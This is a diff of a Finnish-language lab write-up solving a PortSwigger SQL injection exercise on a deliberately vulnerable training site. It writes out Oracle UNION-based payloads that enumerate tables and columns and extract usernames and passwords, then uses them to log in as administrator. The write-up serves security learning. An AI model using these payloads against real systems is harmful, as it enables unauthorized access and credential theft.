@@ -382,22 +382,48 @@ Siellä on sisäänkirjautuminen.
 
 <img src="/images/login8.png" alt="" title="" width="70%" height="70%">
 
-Suuntasin takaisin ja menin kategoriaan "Pets". Aloin suorittamaan samalla tavalla kuin aikaisemmin. <code>'+UNION+SELECT+null,+NULL+FROM+dual--</code> toimii. Myös <code>'+UNION+SELECT+null,+NULL+FROM+all_tables--</code> toimii. Käytän tässä apuna aikaisempaa [cheatsheetia](https://portswigger.net/web-security/sql-injection/cheat-sheet). <code>'+UNION+SELECT+user,+NULL+FROM+all_tables--</code> toimii, katsoin miltä se näyttää selaimessa ja sieltä paljastui käyttäjä "Peter", mutta ei muita käyttäjiä. 
+Suuntasin takaisin ja menin kategoriaan "Pets". Aloin suorittamaan samalla tavalla kuin aikaisemmin. <code>'+UNION+SELECT+null,+NULL+FROM+dual--</code> toimii. 
 
+<img src="/images/pets1.png" alt="" title="" width="70%" height="70%">
 
-<code>'+UNION+SELECT+table_name,+null+FROM+all_tables--</code> paljastui tuhansia tauluja. 
+Myös <code>'+UNION+SELECT+null,+NULL+FROM+all_tables--</code> toimii. Käytän tässä tehtävässä apuna aikaisempaa [cheatsheetia](https://portswigger.net/web-security/sql-injection/cheat-sheet). 
 
-KÄytin selaimessa CMD+F, jolloin voidaan käyttää hakutoimintoa. Hain hakusanalalla "USER". Lopulta löysin mielenkiintoisen taulun.
+<img src="/images/pets2.png" alt="" title="" width="70%" height="70%">
 
+<code>'+UNION+SELECT+user,+NULL+FROM+all_tables--</code> toimii, katsoin miltä se näyttää selaimessa ja sieltä paljastui käyttäjä "Peter", mutta ei muita käyttäjiä. 
 
-<code>'UNION+SELECT+USERNAME_ULJADC,+PASSWORD_EOGGKV+FROM+USERS_YIFANH--</code>
+<img src="/images/pets3.png" alt="" title="" width="70%" height="70%">
+<img src="/images/peter.png" alt="" title="" width="70%" height="70%">
+
+En saanut lisääkäyttäjiä näkyviin. Kuitenkin hieman injektiolauseketta pyöritettyäni sain taulut näkyviin. Tauluja oli tuhansia.
+
+    <code>'+UNION+SELECT+table_name,+null+FROM+all_tables--</code>.
+
+<img src="/images/pets5.png" alt="" title="" width="70%" height="70%">
+<img src="/images/pets4.png" alt="" title="" width="70%" height="70%">
+
+Käytin selaimessa CMD+F, jolloin voidaan käyttää hakutoimintoa. Hain hakusanalalla "USER". Lopulta löysin mielenkiintoisen taulun.
+
+<img src="/images/pets6.png" alt="" title="" width="70%" height="70%">
+
+Käytämme löytämäämme taulua seuraavaksi hyödyksi.
+
+    <code>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_YIFANH'--</code>
+
+<img src="/images/pets7.png" alt="" title="" width="70%" height="70%">
+
+Löysimme käyttäjänimi ja salasana- sarakkeet. Käytämme seuraavaa payloadia saadaksemme käyttäjänimet ja salasanat:
+
+    'UNION+SELECT+USERNAME_ULJADC,+PASSWORD_EOGGKV+FROM+USERS_YIFANH--
 
 <img src="/images/adminpass.png" alt="" title="" width="70%" height="70%">
+
+Sieltä löyty kolme käyttäjää: administrator, carlos ja wiener. Käytämme administrator käyttäjän tunnuksia kirjautuessa sisälle.
+
 <img src="/images/solved18.png" alt="" title="" width="70%" height="70%">
 
+Tehtävä suoritettu!
 
-
-  
 - h) [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 - i) [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
 - j) [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
